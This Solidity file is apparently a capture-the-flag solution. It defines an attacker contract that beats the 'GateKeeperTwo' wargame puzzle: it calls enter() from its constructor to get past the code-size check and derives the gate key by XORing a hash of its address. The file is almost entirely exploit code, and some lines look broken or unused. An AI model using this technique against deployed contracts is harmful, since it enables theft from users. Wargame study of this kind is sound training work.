pragma solidity ^0.4.0;

interface GateKeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGateTwo {
    bytes16 public one = bytes16(-1);
    bytes8 public gateKey;
    bytes8 public msgSender;
    bytes8 public result;

    constructor(address gateAddress) public {
        GateKeeperTwo gateKeeperTwo = GateKeeperTwo(gateAddress);
        bytes8 byteKey = bytes8(msg.sender);
        // msgSender = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this))));
        gateKey = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)
        );
        gateKeeperTwo.call.gas(300000)(
            bytes4(keccak256("enter(bytes8)")),
            gateKey
        );
        result = msgSender ^ gateKey;
    }
}
